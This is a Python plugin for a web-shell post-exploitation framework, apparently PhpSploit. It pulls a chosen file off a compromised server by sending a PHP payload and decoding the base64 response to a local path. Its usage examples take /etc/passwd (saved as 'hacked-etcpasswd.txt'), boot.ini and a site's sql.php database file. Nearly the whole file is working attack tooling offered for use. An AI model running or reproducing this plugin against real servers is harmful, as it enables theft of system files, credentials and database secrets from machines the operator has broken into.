"""Download a remote file

SYNOPSIS:
    download [-f] <REMOTE FILE> [<LOCAL DESTINATION>]

OPTIONS:
    -f      Overwrite destination without confirmation if it
            already exists.

DESCRIPTION:
    Download a remote file to your local system.
    - In the case the destination is a directory, the file will
    be copied into it keeping it's original file name.
    - Unless the '-f' option has been set, the download process
    aborts if the destination file already exists, and asks for
    a confirmation to overwrite the file.
    - If the LOCAL DESTINATION is not given, the plugin assumes
    destination as the current local working directory (which
    can be known with the 'lpwd' command)

    NOTE: For the moment, only a single file can be downloaded
    at the time. Recursive directory downloads and multiple
    file downloads are not available.

EXAMPLES:
    > download C:\boot.ini /tmp/pentest/
      - Download the remote boot.ini file into your local dir
    > download -f /etc/passwd ./hacked-etcpasswd.txt
      - Download the current remote passwd file and force copy
    > download /srv/www/inc/sql.php
      - Downalod the sql.php file to the current local directory

AUTHOR:
    nil0x42 <http://goo.gl/kb2wf>
"""

import sys
import os
import base64

import ui.input
from datatypes import Path

from api import plugin
from api import server

if not 2 <= len(plugin.argv) <= 4:
    sys.exit(plugin.help)


if plugin.argv[1] == "-f":
    force = True
    arg1 = 2
    arg2 = 3
    arglen = len(plugin.argv) - 1
else:
    force = False
    arg1 = 1
    arg2 = 2
    arglen = len(plugin.argv)

relpath = plugin.argv[arg1]

if arglen == 3:
    local_relpath = plugin.argv[arg2]
else:
    local_relpath = os.getcwd()

abspath = server.path.abspath(relpath)
local_abspath = os.path.abspath(local_relpath)
local_dirname = local_abspath
local_basename = server.path.basename(abspath)

if not os.path.isdir(local_dirname):
    local_dirname = os.path.dirname(local_dirname)
    if os.path.isdir(local_dirname):
        local_basename = os.path.basename(local_abspath)
    else:
        sys.exit("%s: Invalid local directory" % local_dirname)

try:
    Path(local_dirname, mode='w')
except ValueError:
    sys.exit("%s: Local directory not writable" % local_dirname)

local_abspath = os.path.join(local_dirname, local_basename)

if not force and os.path.exists(local_abspath):
    if os.path.isfile(local_abspath):
        question = "Local destination %s already exists, overwrite it ?"
        if ui.input.Expect(False)(question % local_abspath):
            sys.exit("File transfer aborted")
    else:
        sys.exit("Local destination %s already exists" % local_abspath)

payload = server.payload.Payload("payload.php")
payload['FILE'] = abspath

response = payload.send()

file = Path(local_abspath)
try:
    file.write(base64.b64decode(response), bin_mode=True)
except ValueError as err:
    sys.exit("Couldn't download file to %s: %s" % (local_abspath, err))

print("[*] Download complete: %s -> %s" % (abspath, local_abspath))
